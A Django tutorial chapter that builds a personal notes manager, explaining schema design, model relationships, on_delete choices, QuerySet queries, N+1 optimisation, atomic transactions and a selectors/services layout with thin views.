docs.title: Tutorial 03 — Domain Design, ORM and the selectors/services architecture
docs.text:
This tutorial walks you through the full cycle from database design to a finished application: the DOMAIN→SCHEMA methodology → relationship types → Django models → migrations → QuerySet API → selectors/services architecture → thin views.

The project is a personal notes manager with all types of relationships between tables.

docs.title: Contents
docs.text:
Theory (read before the code) - 01 · DOMAIN → SCHEMA — a 7-step methodology - 02 · RELATIONSHIP TYPES — OneToOne, ForeignKey, ManyToMany - 03 · on_delete — deletion strategies - 04 · DJANGO ORM — QuerySet API - 05 · THE N+1 PROBLEM — select_related and prefetch_related - 06 · transaction.atomic — atomic operations - 07 · APPLICATION LAYERS — the selectors/services architecture

Step-by-step implementation 1. Step 0 — From domain to schema 2. Step 1 — Designing the domain 3. Step 2 — Entities and relationships 4. Step 3 — ER diagram 5. Step 4 — Django models 6. Step 5 — Migrations 7. Step 6 — QuerySet queries in the shell 8. Step 7 — selectors.py 9. Step 8 — services.py 10. Step 9 — Thin views

docs.title: 01 · DOMAIN → SCHEMA
docs.text: "Design before code." Mistake #1 is starting with class Note(models.Model) and adding fields "on the fly". A month later — refactoring the schema = a complex migration that is hard to roll back in prod. 30 minutes of design = weeks of saved time.

docs.title: The 7-step methodology
docs.text: # Step What you do Example 1 DOMAIN Describe in words what you are building "A user has notebooks. Notebooks contain notes. Notes have tags and reminders." 2 ENTITIES Find the nouns in the description User, Notebook, Note, Tag, Reminder 3 ATTRIBUTES What do we know about each entity? Note → title, content, priority, is_pinned, is_archived 4 RELATIONSHIPS How are the entities related? 1:1 User↔Profile · 1:N Notebook→Notes · M:N Note↔Tag 5 NORMALIZATION Remove duplication author_name in Note? — No, only an FK to User 6 on_delete What happens when the parent is deleted? CASCADE / SET_NULL / PROTECT 7 DJANGO MODEL Only now do we write models.py ← Typical mistake: starting here

docs.title: Where the "truth" lives
docs.text:
Normalization — every fact is stored in exactly one place.

❌ DENORMALIZED SCHEMA (duplication):
NOTE table:
  author_name VARCHAR(150)  ← duplication of the user's name!
  author_email VARCHAR(254) ← and the email too!

Problem:
  1. The user changes their name → you must UPDATE all their notes
  2. Inconsistency: note.author_name ≠ user.username → DATA INCONSISTENCY
  3. Deleting the user → orphan records without an author

✅ NORMALIZED SCHEMA:
NOTE table:
  user_id BIGINT FK → auth_user  ← one fact: this note belongs to the user with this id

The user's name? → note.user.username (JOIN)
The user's email? → note.user.email (JOIN)
One source of truth → no inconsistency

docs.title: 1:1 — OneToOneField
docs.text:
USER ──────────────► USER_PROFILE
  id PK                 user_id UNIQUE FK

class UserProfile(models.Model):
    user = models.OneToOneField(
        User,
        on_delete=models.CASCADE,
        related_name='profile',
    )
    display_name = models.CharField(max_length=60, blank=True)
    timezone     = models.CharField(max_length=40, default='UTC')
    avatar_url   = models.URLField(blank=True)

    def __str__(self):
        return f'Profile({self.user.username})'

The SQL Django generates: 

CREATE TABLE "hello_app_userprofile" (
    "id"           bigint NOT NULL PRIMARY KEY GENERATED BY DEFAULT AS IDENTITY,
    "user_id"      bigint NOT NULL UNIQUE REFERENCES "auth_user" ("id") ON DELETE CASCADE,
    "display_name" varchar(60) NOT NULL DEFAULT '',
    "timezone"     varchar(40) NOT NULL DEFAULT 'UTC',
    "avatar_url"   varchar(200) NOT NULL DEFAULT ''
);

Reverse — access from User: 

user = User.objects.get(username='alice')
user.profile              # → UserProfile (not a QuerySet! UNIQUE FK → a single object)
user.profile.timezone     # → 'Europe/Kyiv'

When to use 1:1? - "Vertical partitioning": 5 basic fields in User, 20 optional ones in Profile - Different access: User changes often, Profile rarely → a separate QuerySet - Different permissions: view_user without view_userprofile

docs.title: 1:N — ForeignKey
docs.text:
NOTEBOOK ────────── NOTE
  id PK              id PK
  user_id FK         notebook_id NULL FK ← the FK lives on the "Many" side
  title              title
                     content

class Note(models.Model):
    notebook = models.ForeignKey(
        'Notebook',                  # ← a string avoids circular imports
        on_delete=models.SET_NULL,   # Deleting the notebook → NULL (not CASCADE!)
        null=True,                   # NULL is required with SET_NULL
        blank=True,                  # Form: the field is optional
        related_name='notes',        # notebook.notes.all() → QuerySet of notes
    )

KEY RULE: the FK lives on the "Many" side.

WRONG way to think:            RIGHT way to think:
Notebook has a list of notes    Note belongs to Notebook
→ Notebook.notes = [...]    → Note.notebook_id = FK
→ a JOIN will happen         → Notebook.notes.all() = reverse

Notebook does NOT store a list of Note IDs!
That would violate normal form and complicate the JOIN.

Reverse — access from the "One" side: 

notebook = Notebook.objects.get(id=1)
notebook.notes.all()                    # ← related_name='notes' → QuerySet
notebook.notes.filter(is_pinned=True)   # Filtering
notebook.notes.count()                  # Count

note = Note.objects.get(id=1)
note.notebook                           # ← FK attr → Notebook object (or None)
note.notebook_id                        # ← raw integer FK without a JOIN
note.notebook.title                     # ← JOIN: SELECT ... WHERE notebook_id=...

docs.title: M:N — ManyToManyField
docs.text:
NOTE ────── NOTE_TAGS (junction) ────── TAG
  id PK       note_id FK                 id PK
  title       tag_id FK                  name
              UNIQUE(note_id, tag_id)

class Note(models.Model):
    tags = models.ManyToManyField(
        'Tag',
        blank=True,              # A note may have no tags
        related_name='notes',    # tag.notes.all() → notes with this tag
    )
    # Django automatically creates the junction table: hello_app_note_tags
    # No need to describe a NoteTag model by hand

Operations with M:N: 

note = Note.objects.get(id=1)
tag_py = Tag.objects.get(name='python')
tag_dj = Tag.objects.get(name='django')

# Add tags
note.tags.add(tag_py, tag_dj)     # INSERT INTO note_tags (note_id, tag_id)

# The full list
note.tags.all()                    # SELECT * FROM tags JOIN note_tags ...

# Remove a specific tag
note.tags.remove(tag_py)           # DELETE FROM note_tags WHERE ...

# Replace all tags
note.tags.set([tag_dj])           # DELETE old ones + INSERT new ones

# Clear all
note.tags.clear()                  # DELETE FROM note_tags WHERE note_id=...

# Reverse — notes with a tag:
tag_py.notes.all()                 # SELECT * FROM notes JOIN note_tags WHERE tag_id=...

docs.title: 03 · on_delete
docs.text:
What does Django do when a "parent" record is deleted? This is a business decision, not a technical one. Think about the user's data!

# CASCADE — delete child records together with the parent
class Reminder(models.Model):
    note = models.ForeignKey(Note, on_delete=models.CASCADE, related_name='reminders')
    # Deleting a Note → all Reminders of that Note are deleted
    # Logic: a Reminder without a Note is meaningless → CASCADE is the right choice

# SET_NULL — the FK becomes NULL, the child record remains
class Note(models.Model):
    notebook = models.ForeignKey(
        Notebook, on_delete=models.SET_NULL,
        null=True, blank=True,  # ← null=True is REQUIRED with SET_NULL
    )
    # Deleting a Notebook → Note.notebook = NULL
    # Logic: the note must be kept! Only the notebook is deleted.

# PROTECT — forbids deletion if there are child records
class Note(models.Model):
    tag = models.ForeignKey(Tag, on_delete=models.PROTECT)
    # Deleting a Tag → ProtectedError (exception)
    # Logic: don't allow deleting a tag while it is in use

# RESTRICT — similar to PROTECT but allows a cascade from a higher level
# Complex hierarchies, rarely used

# SET_DEFAULT — the FK becomes the default value
class Note(models.Model):
    notebook = models.ForeignKey(
        Notebook, on_delete=models.SET_DEFAULT,
        default=1,  # ← pk of the default notebook
    )

# DO_NOTHING — leaves an orphan record (the FK points to a nonexistent id)
# AVOID: leads to IntegrityError or dirty data

docs.title: The on_delete decision matrix
docs.text: If you delete... What do we want for the children? on_delete Note Delete the Reminders (they make no sense without the Note) CASCADE Notebook Keep the Notes (a note matters more than the notebook) SET_NULL User Delete all Notes (the content belongs to the user) CASCADE Tag Forbid deletion (the tag is in use) PROTECT

docs.title: 04 · Django ORM
docs.text: ORM (Object-Relational Mapping) — you write Python, Django generates SQL.

docs.title: QuerySet — lazy objects
docs.text:
# QuerySet is LAZY: SQL is not executed until the data is needed
qs = Note.objects.filter(user=alice)   # ← NOTHING happened in the DB!
qs = qs.filter(is_pinned=True)         # ← Only refining the query
qs = qs.order_by('-priority')          # ← Still nothing in the DB

# SQL IS EXECUTED here — when we iterate, count, convert:
notes = list(qs)           # ← SELECT NOW!
count = qs.count()         # ← SELECT COUNT(*)
first = qs.first()         # ← SELECT ... LIMIT 1
exists = qs.exists()       # ← SELECT 1 ... LIMIT 1 (very fast)
for note in qs: ...        # ← SELECT and iteration
note = qs.get(pk=1)        # ← SELECT WHERE pk=1

# ADVANTAGE OF LAZINESS:
# You can pass a QuerySet to the template → SQL runs only during rendering
# You can chain filters: qs.filter(A).filter(B) = one SELECT with two WHEREs

docs.title: Filtering — lookups
docs.text:
# Exact equality:
Note.objects.filter(priority=3)
# SQL: WHERE priority = 3

# Comparison:
Note.objects.filter(priority__gt=1)    # greater than → > 1
Note.objects.filter(priority__gte=2)   # greater or equal → >= 2
Note.objects.filter(priority__lt=3)    # less than → < 3
Note.objects.filter(priority__lte=2)   # less or equal → <= 2

# Strings:
Note.objects.filter(title__exact='Test')          # = 'Test' (case-sensitive)
Note.objects.filter(title__iexact='test')          # = 'test' (case-insensitive)
Note.objects.filter(title__contains='Django')      # LIKE '%Django%'
Note.objects.filter(title__icontains='django')     # ILIKE '%django%'
Note.objects.filter(title__startswith='Hello')     # LIKE 'Hello%'
Note.objects.filter(title__endswith='.md')         # LIKE '%.md'

# NULL:
Note.objects.filter(notebook__isnull=True)         # IS NULL
Note.objects.filter(notebook__isnull=False)        # IS NOT NULL

# Lists:
Note.objects.filter(priority__in=[1, 2])           # IN (1, 2)
Note.objects.exclude(priority__in=[3, 4])          # NOT IN (3, 4)

# Dates:
Note.objects.filter(created_at__year=2026)
Note.objects.filter(created_at__date=date(2026, 6, 13))
Note.objects.filter(created_at__gte=datetime(2026, 1, 1))

# FK:
Note.objects.filter(notebook=my_notebook)          # WHERE notebook_id = X
Note.objects.filter(notebook__title='Work')        # JOIN: WHERE notebook.title = 'Work'
Note.objects.filter(notebook__user=request.user)   # 2 JOIN levels

# M:N:
Note.objects.filter(tags=tag_python)               # notes with the python tag
Note.objects.filter(tags__name='python')           # JOIN on Tag
Note.objects.filter(tags__name__icontains='py')    # JOIN + LIKE

docs.title: Q objects — complex conditions
docs.text:
from django.db.models import Q

# OR condition:
Note.objects.filter(Q(title__icontains='django') | Q(content__icontains='django'))
# SQL: WHERE (title ILIKE '%django%' OR content ILIKE '%django%')

# AND (by default several filters = AND):
Note.objects.filter(Q(is_pinned=True) & Q(priority=3))
# SQL: WHERE is_pinned = TRUE AND priority = 3

# NOT:
Note.objects.filter(~Q(is_archived=True))
# SQL: WHERE NOT is_archived = TRUE  (= WHERE is_archived = FALSE)

# Combining:
Note.objects.filter(
    Q(user=alice) | Q(group__in=alice_groups)
).filter(
    is_archived=False
)
# SQL: WHERE (user_id = 1 OR group_id IN (...)) AND is_archived = FALSE

docs.title: Annotations and aggregates
docs.text:
from django.db.models import Count, Avg, Max, Min, Sum, F

# Count — the number of related objects
Notebook.objects.annotate(note_count=Count('notes'))
# SQL: SELECT *, COUNT(notes.id) AS note_count FROM notebooks LEFT JOIN notes ...
# notebook.note_count is available on every object

# Filtered Count
Notebook.objects.annotate(
    active_count=Count('notes', filter=Q(notes__is_archived=False))
)

# Aggregate — one value for the whole QuerySet
Note.objects.aggregate(avg_priority=Avg('priority'))
# → {'avg_priority': 1.8}

Note.objects.filter(user=alice).aggregate(
    total=Count('id'),
    pinned=Count('id', filter=Q(is_pinned=True)),
    max_priority=Max('priority'),
)
# → {'total': 42, 'pinned': 5, 'max_priority': 3}

# F objects — a reference to a field in SQL (without loading it into Python)
Note.objects.filter(views_count__gt=F('priority') * 100)
# SQL: WHERE views_count > priority * 100
# Without F: you would have to load all objects into Python and filter in a loop!

# update with F():
Note.objects.all().update(views_count=F('views_count') + 1)
# SQL: UPDATE ... SET views_count = views_count + 1
# An atomic operation! No race condition.

docs.title: values() and values_list()
docs.text:
# Returns dictionaries instead of objects (faster for large QuerySets)
Note.objects.values('title', 'priority')
# → [{'title': 'Test', 'priority': 1}, ...]

# Returns tuples (even faster)
Note.objects.values_list('title', 'priority')
# → [('Test', 1), ('Django', 2), ...]

# flat=True: one column → a flat list
Note.objects.values_list('id', flat=True)
# → [1, 2, 3, 4, ...]

# Save all ids into a list:
note_ids = list(Note.objects.filter(user=alice).values_list('id', flat=True))

docs.title: order_by, distinct, only, defer
docs.text:
# Sorting:
Note.objects.order_by('priority')           # ASC
Note.objects.order_by('-priority')          # DESC
Note.objects.order_by('-is_pinned', '-priority', '-updated_at')  # Multiple

# Remove duplicates (with a JOIN):
Note.objects.filter(tags__name='python').distinct()

# Load only certain fields (optimization):
Note.objects.only('id', 'title', 'priority')   # Other fields → an additional SELECT on access
Note.objects.defer('content')                   # All fields EXCEPT content

# Limiting (LIMIT / OFFSET):
Note.objects.all()[:10]                        # LIMIT 10
Note.objects.all()[10:20]                      # LIMIT 10 OFFSET 10
Note.objects.all()[0]                          # LIMIT 1 (= .first() but not None)

docs.title: 05 · The N+1 Problem
docs.text: The most common performance bug in Django — Django makes 1 + N SQL queries instead of 1.

docs.title: The connection with lazy evaluation
docs.text:
N+1 happens precisely because a QuerySet is lazy. The student already knows that for note in notes: materializes one SELECT. But as soon as note.notebook appears in the template, Django does not know that notebook will be needed for every note, and makes a separate SELECT for each one:

{% for note in notes %}
    {{ note.notebook.title }}   ← for each note: SELECT FROM notebooks WHERE id=?
{% endfor %}

50 notes → the template "asks for" the notebook 50 times → 51 SQL queries instead of the expected one.

This is not a Django bug — it is a natural consequence of lazy loading. The solution is to tell Django explicitly in advance which relationships will be needed.

docs.title: What N+1 is
docs.text:
# 50 notes in the database. Each has a ForeignKey to Notebook.
notes = Note.objects.all()          # Query 1: SELECT * FROM notes  ← 50 rows

for note in notes:
    print(note.notebook.title)       # Query 2, 3, 4, ..., 51!
    # Each note.notebook.title → a SEPARATE SELECT FROM notebooks WHERE id=...
    # 50 notes → 50 extra queries → 51 TOTAL!

docs.title: Solution: select_related (ForeignKey / OneToOne)
docs.text:
# select_related: Django does a JOIN → 1 query instead of 51
notes = Note.objects.select_related('notebook').all()
# SQL: SELECT notes.*, notebooks.* FROM notes LEFT JOIN notebooks ON notebook_id=notebooks.id

for note in notes:
    print(note.notebook.title)   # ← the data is already in memory, no SQL at all!

docs.title: Solution: prefetch_related (ManyToMany / reverse FK)
docs.text:
# prefetch_related: 2 queries instead of 1 + N
notes = Note.objects.prefetch_related('tags').all()
# SQL query 1: SELECT * FROM notes
# SQL query 2: SELECT tags.* FROM tags JOIN note_tags WHERE note_id IN (1,2,3,...)
# Django joins the results in memory by itself

for note in notes:
    for tag in note.tags.all():   # ← from the cache, no SQL at all!
        print(tag.name)

docs.title: Combining
docs.text:
# A real example: the note_list view
def get_user_notes(user, *, archived=False):
    return Note.objects.filter(
        user=user,
        is_archived=archived,
    ).select_related(
        'notebook',   # FK → JOIN (1 query)
        'user',       # FK → JOIN (already there, but explicit)
    ).prefetch_related(
        'tags',       # M:N → 2 queries total
    ).order_by('-is_pinned', '-priority', '-updated_at')

# TOTAL: 2 SQL queries for any number of notes ✓
# WITHOUT optimization: 1 + N + N SQL (for N notes)

    import debug_toolbar

docs.title: 06 · transaction.atomic
docs.text: An atomic operation: either ALL changes are saved, or NONE.

docs.title: The problem without atomic
docs.text:
def create_note(user, title, tag_ids):
    note = Note.objects.create(user=user, title=title)
    # ← INSERT INTO note → id=42

    # AN ERROR HERE (for example, the tag does not exist):
    tags = Tag.objects.filter(id__in=tag_ids, user=user)
    note.tags.set(tags)   # ← An exception because of a wrong tag_id!

    # DATABASE STATE:
    # The Note with id=42 exists (the INSERT already happened)
    # But the tags are not attached
    # INCONSISTENT STATE! An "orphan" without tags

docs.title: The solution — transaction.atomic
docs.text:
from django.db import transaction

def create_note(user, title, tag_ids):
    with transaction.atomic():
        note = Note.objects.create(user=user, title=title)
        # ← While inside the atomic block → BEGIN TRANSACTION

        tags = Tag.objects.filter(id__in=tag_ids, user=user)
        note.tags.set(tags)
        # ← If an exception occurs → ROLLBACK of the whole block
        # The Note is NOT saved in the DB!

    # ← If everything is OK → COMMIT
    return note

docs.title: Nested atomic blocks — savepoints
docs.text:
def complex_operation():
    with transaction.atomic():      # ← BEGIN
        do_operation_1()            # ← INSERT ...

        with transaction.atomic():  # ← SAVEPOINT sp_1
            do_operation_2()        # ← INSERT ...
            # If an exception occurs here → ROLLBACK TO sp_1
            # operation_1 remains!

        do_operation_3()            # ← INSERT ...
    # ← COMMIT (if everything is OK)

docs.title: @transaction.atomic as a decorator
docs.text:
@transaction.atomic
def create_notebook(user, title, is_default=False):
    """
    Business rule: a user has only ONE default notebook.
    These two queries must be atomic:
    1. Reset the previous default
    2. Set the new one
    """
    if is_default:
        Notebook.objects.filter(user=user, is_default=True).update(is_default=False)
        # ← If an exception occurs here → there will be no "no default at all" situation
    return Notebook.objects.create(user=user, title=title, is_default=is_default)
    # ← Both operations, or both are rolled back

docs.title: 07 · Application Layers
docs.text: Splitting responsibility between layers is a key architectural practice.

docs.title: The problem: a "Fat View"
docs.text:
# ❌ ANTIPATTERN: all the logic in the view
def note_list(request):
    # Does the view know about QuerySet optimization? Not its business!
    notes = Note.objects.filter(
        user=request.user,
        is_archived=False,
    ).select_related('notebook').prefetch_related('tags')

    # Does the view know about business rules? Not its business!
    if request.GET.get('q'):
        notes = notes.filter(
            Q(title__icontains=request.GET['q']) |
            Q(content__icontains=request.GET['q'])
        )

    # If this logic is needed in an API endpoint or a Celery task → do we copy it?!
    return render(request, 'note_list.html', {'notes': notes})

docs.title: The solution: Thin View + selectors/services
docs.text:
HTTP REQUEST
     │
     ▼
┌────────────────────────────────────────────────────────────────────────┐
│  views.py                                                               │
│  ✓ Parses request parameters: request.GET.get('q', '')                 │
│  ✓ Calls a selector or a service                                        │
│  ✓ render or redirect                                                   │
│  ✗ Does NOT contain QuerySets                                           │
│  ✗ Does NOT contain business rules                                      │
└────────────────────────────────────┬───────────────────────────────────┘
                    READ ↓           │          WRITE ↓
                    ▼                │          ▼
┌───────────────────────────┐        │  ┌────────────────────────────────┐
│  selectors.py              │        │  │  services.py                   │
│  ✓ SELECT with filters     │        │  │  ✓ CREATE / UPDATE / DELETE    │
│  ✓ select_related          │        │  │  ✓ transaction.atomic()        │
│  ✓ prefetch_related        │        │  │  ✓ business rules              │
│  ✓ annotate                │        │  │  ✗ NO render / redirect        │
│  ✗ NO INSERT/UPDATE/DELETE │        │  │  ✗ NO QuerySets unless needed  │
└────────────────┬───────────┘        │  └───────────────────┬────────────┘
                 └────────────────────┘                       │
                                  PostgreSQL ◄─────────────────┘

docs.title: The responsibility matrix
docs.text:
Layer Does Does NOT do models.py Structure, fields, constraints, __str__, Meta Business logic, HTTP selectors.py SELECT, filter, annotate, prefetch INSERT / UPDATE / DELETE services.py CREATE / UPDATE / DELETE, transaction HTTP, render, redirect views.py Parse the request, render, redirect QuerySets, business logic

The check rule: if you see Note.objects.filter(...) in views.py → move it to selectors.py.

docs.title: Step 0 — From domain to schema
docs.text:
WRONG: coding the models right away.

RIGHT: first describe it in words:

"A user has a profile (1:1). A user creates notebooks (1:N). Notebooks contain notes (1:N). Notes have tags (M:N) and reminders (1:N). A note may have no notebook (SET_NULL)."

Now we pick out nouns = Entities and verbs = Relationships.

docs.title: Step 1 — Designing the domain
docs.text: What we build Description Notes manager A user creates notes with tags and reminders Notebooks Group notes (one note → one notebook or none) Priority 1-3, affects sorting Pinning is_pinned → at the top of the list Archive is_archived → hidden from the main list

User (built-in Django auth_user)

docs.title: Step 4 — Django models
docs.text:
hello_app/models.py:

from django.contrib.auth.models import User
from django.core.validators import MinValueValidator, MaxValueValidator
from django.db import models


class UserProfile(models.Model):
    user         = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')
    display_name = models.CharField(max_length=60, blank=True)
    timezone     = models.CharField(max_length=40, default='UTC')

    def __str__(self):
        return f'Profile({self.user.username})'


class Tag(models.Model):
    user  = models.ForeignKey(User, on_delete=models.CASCADE, related_name='tags')
    name  = models.CharField(max_length=50)
    color = models.CharField(max_length=7, default='#6c757d')  # Hex color

    class Meta:
        ordering       = ['name']
        constraints    = [
            models.UniqueConstraint(fields=['user', 'name'], name='unique_user_tag'),
        ]

    def __str__(self):
        return f'#{self.name}'


class Notebook(models.Model):
    user       = models.ForeignKey(User, on_delete=models.CASCADE, related_name='notebooks')
    title      = models.CharField(max_length=100)
    color      = models.CharField(max_length=7, default='#6c757d')
    is_default = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['-is_default', 'title']

    def __str__(self):
        return self.title


class Note(models.Model):
    PRIORITY_LOW    = 1
    PRIORITY_MEDIUM = 2
    PRIORITY_HIGH   = 3
    PRIORITY_CHOICES = [
        (PRIORITY_LOW,    'Низький'),
        (PRIORITY_MEDIUM, 'Середній'),
        (PRIORITY_HIGH,   'Високий'),
    ]

    user     = models.ForeignKey(User, on_delete=models.CASCADE, related_name='notes')
    notebook = models.ForeignKey(
        Notebook, on_delete=models.SET_NULL,
        null=True, blank=True, related_name='notes',
    )
    tags = models.ManyToManyField(Tag, blank=True)

    title       = models.CharField(max_length=200)
    content     = models.TextField(blank=True)
    priority    = models.SmallIntegerField(
        choices=PRIORITY_CHOICES, default=PRIORITY_LOW,
        validators=[MinValueValidator(1), MaxValueValidator(3)],
    )
    is_pinned   = models.BooleanField(default=False)
    is_archived = models.BooleanField(default=False)
    created_at  = models.DateTimeField(auto_now_add=True)
    updated_at  = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ['-is_pinned', '-priority', '-updated_at']

    def __str__(self):
        return f'📌 {self.title}' if self.is_pinned else self.title

PRIORITY_CHOICES in notes_chat_app

This model uses 3 levels (1–3) for the learning project. notes_chat_app (the final project) has 4 levels: PRIORITY_URGENT = 4 ("🔴 Терміново"), PositiveSmallIntegerField instead of SmallIntegerField, and MaxValueValidator(4). In addition, notes_chat_app.Note has a group = ForeignKey(Group) field for group sharing (added in Step 5 — Authentication and security).

class Reminder(models.Model):
    note      = models.ForeignKey(Note, on_delete=models.CASCADE, related_name='reminders')
    remind_at = models.DateTimeField()
    is_sent   = models.BooleanField(default=False)

    class Meta:
        ordering = ['remind_at']

    def __str__(self):
        return f'Reminder({self.note.title}, {self.remind_at})'

tag_dj = Tag.objects.create(user=alice, name='django', color='#092E20')

# Notes
note1 = Note.objects.create(
    user=alice, notebook=nb, title='Django ORM',
    content='Дуже потужний!', priority=Note.PRIORITY_HIGH, is_pinned=True
)
note1.tags.add(tag_py, tag_dj)

note2 = Note.objects.create(
    user=alice, title='Python tips', priority=Note.PRIORITY_MEDIUM
)
note2.tags.add(tag_py)

# Reminders
Reminder.objects.create(note=note1, remind_at='2026-07-01 09:00:00')

# Queries:
Note.objects.filter(user=alice).count()                    # → 2
Note.objects.filter(user=alice, is_pinned=True)            # → <QuerySet [<Note: 📌 Django ORM>]>
Note.objects.filter(tags=tag_py)                           # → both notes
Note.objects.filter(tags__name='django')                   # → note1

# With optimization:
notes = Note.objects.filter(user=alice)\
    .select_related('notebook')\
    .prefetch_related('tags')

for note in notes:
    print(f'{note.title} → {note.notebook} → {list(note.tags.all())}')
# Django ORM → Work → [#python, #django]
# Python tips → None → [#python]

# Annotate — the number of tags per note:
from django.db.models import Count
Note.objects.annotate(tag_count=Count('tags'))

from django.db.models import Count, Q

from .models import Note, Notebook, Tag


def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """
    The user's notes list with optimized JOINs.

    Keyword-only kwargs (after *) — protection against positional arguments:
    get_user_notes(alice, True) → TypeError (unclear that True = archived)
    get_user_notes(alice, archived=True) → OK, explicit
    """
    qs = Note.objects.filter(
        user=user,
        is_archived=archived,
    ).select_related(
        'notebook',   # FK: 1 JOIN, not N queries
    ).prefetch_related(
        'tags',       # M:N: a 2nd SELECT IN (...), not N queries
    )

    if notebook:
        qs = qs.filter(notebook=notebook)
    if tag:
        qs = qs.filter(tags=tag)
    if search:
        qs = qs.filter(
            Q(title__icontains=search) | Q(content__icontains=search)
        )

    return qs.order_by('-is_pinned', '-priority', '-updated_at')
    # Order: pinned first → priority → recently updated


def get_user_notebooks(user):
    """Notebooks with the number of active notes."""
    return Notebook.objects.filter(user=user).annotate(
        note_count=Count('notes', filter=Q(notes__is_archived=False))
        # annotate: notebook.note_count is available in the template
    ).order_by('-is_default', 'title')


def get_user_tags(user):
    """Tags with the number of notes."""
    return Tag.objects.filter(user=user).annotate(
        note_count=Count('notes')
    ).order_by('name')


def get_note_for_user(user, pk):
    """
    Returns the note if it belongs to user, or None.
    Used in a view instead of get_object_or_404 when softer handling is needed.
    """
    return Note.objects.filter(user=user, pk=pk).select_related('notebook').first()

from django.db import transaction

from .models import Note, Notebook, Tag


def create_note(*, user, title, content='', notebook=None, priority=1, tag_ids=None):
    """
    Creates a note with tags atomically.

    transaction.atomic(): either the Note and the tags are saved together, or nothing.
    Tag protection: filter(user=user) → other users' tags are ignored (Mass Assignment protection).
    """
    with transaction.atomic():
        note = Note.objects.create(
            user=user,
            title=title,
            content=content,
            notebook=notebook,
            priority=priority,
        )
        if tag_ids:
            valid_tags = Tag.objects.filter(id__in=tag_ids, user=user)
            # filter(user=user): Protection! A user cannot attach other users' tags.
            note.tags.set(valid_tags)
    return note


def update_note(note, *, title=None, content=None, notebook=..., priority=None,
                is_pinned=None, is_archived=None, tag_ids=None):
    """
    Updates only the passed fields.
    update_fields → UPDATE only the changed columns (more efficient).

    notebook=... (Ellipsis) = "not passed" (notebook is not changed).
    notebook=None           = "remove the notebook" (SET_NULL).
    notebook=<Notebook>     = "set the notebook".
    Ellipsis distinguishes "not passed" from "passed None".
    """
    changed = []
    if title is not None:
        note.title = title
        changed.append('title')
    if content is not None:
        note.content = content
        changed.append('content')
    if notebook is not ...:              # Ellipsis = the "not passed" sentinel
        note.notebook = notebook         # None → SET_NULL; <Notebook> → set it
        changed.append('notebook')
    if priority is not None:
        note.priority = priority
        changed.append('priority')
    if is_pinned is not None:
        note.is_pinned = is_pinned
        changed.append('is_pinned')
    if is_archived is not None:
        note.is_archived = is_archived
        changed.append('is_archived')

    if changed:
        changed.append('updated_at')  # Always update the timestamp
        note.save(update_fields=changed)
        # SQL: UPDATE hello_app_note SET title=..., updated_at=... WHERE id=...
        # NOT: UPDATE hello_app_note SET ... (all fields)

    if tag_ids is not None:
        valid_tags = Tag.objects.filter(id__in=tag_ids, user=note.user)
        note.tags.set(valid_tags)   # DELETE old ones + INSERT new ones

    return note


def toggle_pin_note(note):
    """Toggles is_pinned and saves it to the DB."""
    note.is_pinned = not note.is_pinned
    note.save(update_fields=['is_pinned', 'updated_at'])
    return note


def delete_note(note):
    """
    Deletes a note.
    CASCADE will automatically delete the related Reminders.
    """
    note.delete()


@transaction.atomic
def create_notebook(user, title, is_default=False):
    """
    Business rule: a user has ONLY ONE default notebook.
    Atomically reset the old one and set the new one.
    """
    if is_default:
        Notebook.objects.filter(user=user, is_default=True).update(is_default=False)
        # UPDATE all to default=False before creating the new one
    return Notebook.objects.create(user=user, title=title, is_default=is_default)

from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.shortcuts import get_object_or_404, redirect, render

from .forms import NoteForm
from .models import Note
from . import selectors, services


@login_required   # ← AnonymousUser → redirect to /accounts/login/?next=...
def note_list(request):
    search   = request.GET.get('q', '')

    # The view only parses parameters — the logic is in the selector
    notes     = selectors.get_user_notes(
        request.user,
        archived=False,
        search=search or None,
    )
    tags      = selectors.get_user_tags(request.user)
    notebooks = selectors.get_user_notebooks(request.user)

    return render(request, 'hello_app/note_list.html', {
        'notes':     notes,
        'tags':      tags,
        'notebooks': notebooks,
        'search':    search,
    })


@login_required
def note_create(request):
    if request.method == 'POST':
        form = NoteForm(request.POST, user=request.user)
        if form.is_valid():
            note = services.create_note(
                user     = request.user,
                title    = form.cleaned_data['title'],
                content  = form.cleaned_data.get('content', ''),
                notebook = form.cleaned_data.get('notebook'),
                priority = form.cleaned_data.get('priority', 1),
                tag_ids  = [t.id for t in form.cleaned_data.get('tags', [])],
            )
            messages.success(request, f'Нотатку "{note.title}" створено!')
            return redirect('hello_app:note_detail', pk=note.pk)
    else:
        form = NoteForm(user=request.user)

    return render(request, 'hello_app/note_form.html', {'form': form, 'title': 'Нова нотатка'})


@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)
    # pk + user=request.user → 404 if it is someone else's note (IDOR protection)

    if request.method == 'POST':
        form = NoteForm(request.POST, instance=note, user=request.user)
        if form.is_valid():
            services.update_note(
                note,
                title    = form.cleaned_data['title'],
                content  = form.cleaned_data.get('content', ''),
                notebook = form.cleaned_data.get('notebook'),
                priority = form.cleaned_data.get('priority'),
                tag_ids  = [t.id for t in form.cleaned_data.get('tags', [])],
            )
            messages.success(request, 'Нотатку оновлено!')
            return redirect('hello_app:note_detail', pk=note.pk)
    else:
        form = NoteForm(instance=note, user=request.user)

    return render(request, 'hello_app/note_form.html', {
        'form': form, 'note': note, 'title': f'Редагувати: {note.title}'
    })


@login_required
def note_delete(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)

    if request.method == 'POST':
        title = note.title
        services.delete_note(note)
        messages.warning(request, f'Нотатку "{title}" видалено.')
        return redirect('hello_app:note_list')

    return render(request, 'hello_app/note_confirm_delete.html', {'note': note})

# forms.py — the whole form structure in Python code
from crispy_forms.helper import FormHelper
from crispy_forms.layout import (
    Layout, Fieldset, Row, Column, Field, Submit, HTML, ButtonHolder
)


class NoteForm(forms.ModelForm):
    class Meta:
        model  = Note
        fields = ['title', 'content', 'priority', 'notebook', 'tags', 'is_pinned']

    def __init__(self, *args, user=None, **kwargs):
        super().__init__(*args, **kwargs)

        # Restrict the notebook and tags querysets to this user only:
        if user:
            self.fields['notebook'].queryset = Notebook.objects.filter(user=user)
            self.fields['tags'].queryset     = Tag.objects.filter(user=user)

        # FormHelper describes the <form> attributes and the layout
        self.helper = FormHelper()
        self.helper.form_method = 'post'
        self.helper.form_id     = 'note-form'

